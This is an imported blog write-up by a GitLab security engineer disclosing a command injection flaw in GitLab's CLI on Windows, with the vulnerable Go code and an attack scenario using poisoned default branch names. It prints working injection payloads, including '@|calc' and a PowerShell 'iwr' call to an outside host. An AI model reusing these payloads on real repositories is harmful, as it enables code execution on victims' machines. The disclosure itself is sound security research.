---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-06_rce-in-gitlabs-cli-tool.md
original_filename: 2023-07-06_rce-in-gitlabs-cli-tool.md
title: RCE In GitLab's CLI Tool
category: documents
detected_topics:
- command-injection
- api-security
- supply-chain
tags:
- imported
- documents
- command-injection
- api-security
- supply-chain
language: en
raw_sha256: 0ea5718151cb6fe85ef562e165b122a78520b4afb3fd7e528c40fe792527d6ba
text_sha256: 751b71919a65a07a06344f1587d470c0de7f9325b27dbe92b873a7acc098b03e
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: false
---

# RCE In GitLab's CLI Tool

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-06_rce-in-gitlabs-cli-tool.md
- Source Type: markdown
- Detected Topics: command-injection, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: False
- Raw SHA256: `0ea5718151cb6fe85ef562e165b122a78520b4afb3fd7e528c40fe792527d6ba`
- Text SHA256: `751b71919a65a07a06344f1587d470c0de7f9325b27dbe92b873a7acc098b03e`


## Content

---
title: "RCE In GitLab's CLI Tool"
page_title: "RCE in GitLab's CLI tool"
url: "http://blog.takemyhand.xyz/2023/07/remote-code-execution-in-gitlabs-cli.html"
final_url: "http://blog.takemyhand.xyz/2023/07/remote-code-execution-in-gitlabs-cli.html"
authors: ["ameya (@0xtakemyhand)"]
programs: ["GitLab"]
bugs: ["RCE", "OS command injection", "Security code review"]
publication_date: "2023-07-06"
added_date: "2023-07-11"
source: "pentester.land/writeups.json"
original_index: 961
---

# RCE in GitLab's CLI tool

Jul 6, 2023 • t4kemyh4nd

# Introduction  

After starting at GitLab in October last year as a security engineer, one of the first reviews that came my way was our CLI tool, which was only recently published officially.  

Taking inspiration from the [command injection vulnerability in Snyk's CLI tool](https://snyk.io/blog/command-injection-vulnerability-cve-2022-40764/), we decided to performed a code review on [GitLab's CLI tool](https://gitlab.com/gitlab-org/cli) to look for improper usage of `**exec.Command**`. A particular code snippet in **`/pkg/browser/browser.go`:**
  
  
  func ForOS(goos, url string) *exec.Cmd {
      exe := "open"
      var args []string
      switch goos {
          case "darwin":
              args = append(args, url)
          case "windows":
              exe = "cmd"
              r := strings.NewReplacer("&amp;", "^&amp;")
              args = append(args, "/c", "start", r.Replace(url))
          default:
              exe = "xdg-open"
              args = append(args, url)
  }
  
  cmd := exec.Command(exe, args...) 

# Attack surface  

Golang does a pretty decent job of protecting against command injection, and we would only be vulnerable to any kind of RCE only if direct calls to `cmd.exe` or `sh` were being made with user input. In the above code snippet, `url` is directly being used to call a command that looks like: `**cmd.exe /c "start <http://url="">**`

If we can control the `url` parameter somehow, we may be able to break out of the URL and inject arbitrary commands. Looking for usage of this function leads us to `**/commands/mr/create/mr_create.go**`. [This line](https://gitlab.com/gitlab-org/cli/-/blob/main/commands/mr/create/mr_create.go#L716) indirectly calls the function that we have noted above:
  
  
  return utils.OpenInBrowser(openURL, browser)
  

`**openURL**` is generated using [the following](https://gitlab.com/gitlab-org/cli/-/blob/main/commands/mr/create/mr_create.go#L707):
  
  
  openURL, err := generateMRCompareURL(opts)
  

Following **`generateMRCompareURL`** leads us to the following [piece of code](https://gitlab.com/gitlab-org/cli/-/blob/main/commands/mr/create/mr_create.go#L742):
  
  
  u, err := url.Parse(opts.SourceProject.WebURL)
  
  
   if err != nil {
      return "", err
  }
  
  
  u.Path += "/-/merge_requests/new"
  u.RawQuery = fmt.Sprintf( "merge_request[title]=%s&amp;merge_request[description]=%s&amp;merge_request[source_branch]=%s&amp;merge_request[target_branch]=%s&amp;merge_request[source_project_id]=%d&amp;merge_request[target_project_id]=%d",
  strings.ReplaceAll(url.PathEscape(opts.Title), "+", "%2B"),
  strings.ReplaceAll(url.PathEscape(description), "+", "%2B"),
  opts.SourceBranch,
  opts.TargetBranch,
  opts.SourceProject.ID,
  opts.TargetProject.ID)
  return u.String(), nil
  

Circling back to what we already covered, if a user supplies the following input:  
`glab mr create --web`,  
the function `**previewMR()**` generates a URL via `**generateMRCompareURL()**`, and due to supplying the **`--web`** flag, `**utils.OpenInBrowser(openURL, browser)**` ends up calling (pay close attention to the **&** char being escaped via the **^** char, which is done to send the **&** as a URL parameter separator instead of a shell character)  
`cmd.exe /c "start https://gitlab.com/test-user/test-repo/-/merge_requests/new?merge_request[title]=%s^&amp;merge_request[description]=%s^&amp;merge_request[source_branch]=%s^&amp;merge_request[target_branch]=%s^&amp;merge_request[source_project_id]=%d^&amp;merge_request[target_project_id]=%d"`  

Looking at `**generateCompareURL()**` to see what parameters we can control:
  
  
  u.RawQuery = fmt.Sprintf( "merge_request[title]=%s&amp;merge_request[description]=%s&amp;merge_request[source_branch]=%s&amp;merge_request[target_branch]=%s&amp;merge_request[source_project_id]=%d&amp;merge_request[target_project_id]=%d",
  strings.ReplaceAll(url.PathEscape(opts.Title), "+", "%2B"),
  strings.ReplaceAll(url.PathEscape(description), "+", "%2B"),
  opts.SourceBranch,
  opts.TargetBranch,
  opts.SourceProject.ID,
  opts.TargetProject.ID)
  return u.String(), nil
  

The **title** and the **description** is set by the user calling the **`glab mr create --web`** command. We could try poisoning either the **source branch name** or the **target branch name**.  

# Exploitation

So, we are at a stage where we need to craft a valid git branch whose name is such that it allows us to break out of the URL and inject arbitrary commands. 

Our current injection point, which is the URL parameter **merge_request[target_branch]** looks like the following  

`cmd.exe /c "start https://gitlab.com/test-user/test-repo/-/merge_requests/new?merge_request[title]=%s^&amp;merge_request[description]=%s^&amp;merge_request[source_branch]=%s^&amp;merge_request[target_branch]=**PAYLOAD-HERE** ^&amp;merge_request[source_project_id]=%d^&amp;merge_request[target_project_id]=%d"`  

The simplest way to break out of the command would be to use something like **& calc.exe**, which could end up calling  
`cmd.exe /c "start https://gitlab.com/test-user/test-repo/-/merge_requests/new?merge_request[target_branch]=**& calc.exe**"`  
As a result, the `start` command would first open the URL `https://gitlab.com/test-user/test-repo/-/merge_requests/new?merge_request[target_branch]=`, and Windows will then run the `calc.exe` process, thanks to the **&** shell character.

However, all **&** chars are escaped using the following line:
  
  
  r := strings.NewReplacer("&amp;", "^&amp;")
  

So, **&** is not an option.

Windows has many file name restrictions, which wouldn't allow you to create a proper payload. However, **this was not the case when creating a branch name within the GitLab UI itself**. After a lot of fuzzing and searching online, the following branch name was finally crafted by using the "@" and "|" character: `a|@calc`. Yes, these are valid command delimiters in Windows commands, and more importantly, **valid branch names** that cannot be created locally, but only via the GitLab UI. This leads to RCE.

What's more useful as an attacker is the ability to set default branches in your projects in GitLab, which mean that by default, all Git clients will load and refer to this branch.  

## Attack scenario

  1. Attacker creates a repository. They create a branch named "@|calc".
  2. To make the attack more convincing, they set this branch as the default branch.
  3. Victim clones the repository on their machine.
  4. Victim tries to create an MR using `glab mr create --web`
  5. The following command is run: `cmd.exe /c "start https://gitlab.com/test-user/test-repo/-/merge_requests/new?merge_request[title]=%s^&amp;merge_request[description]=%s^&amp;merge_request[source_branch]=%s^&amp;merge_request[target_branch]=**@|calc** ^&amp;merge_request[source_project_id]=%d^&amp;merge_request[target_project_id]=%d"`.
  6. The pipe character allows to break out of the URL context and launch `calc`.

## PoC video

# Further limitations  

After trying to craft a more practical payload that would do more than just pop calc, I came across the following restrictions  

  1. Can't use the space character for a more complex payload
  2. Length limit due to branch name specifications

After further fuzzing, I found out that we can fully chain arbitrary Windows commands using the ";" command delimiter. The branch name for this exploitation would be:

`a|@powershell;iwr('pingb.in/p/1df28a9c513ab75e6a3c73d52b8f')`

This will first open up Powershell, then run the commands following the ';' character inside it. This is also something I wasn't aware of before.  

# Conclusion

People often discount CLI tools when it comes to finding impactful security issues, but it shouldn't be forgotten that as long as there are venues that process user input, especially using sensitive sinks that deal with shell commands, local filesystem operations etc., there is always a chance that things might go wrong - so be sure to thoroughly analyze the different functionalities of such tools.  

## 

` `
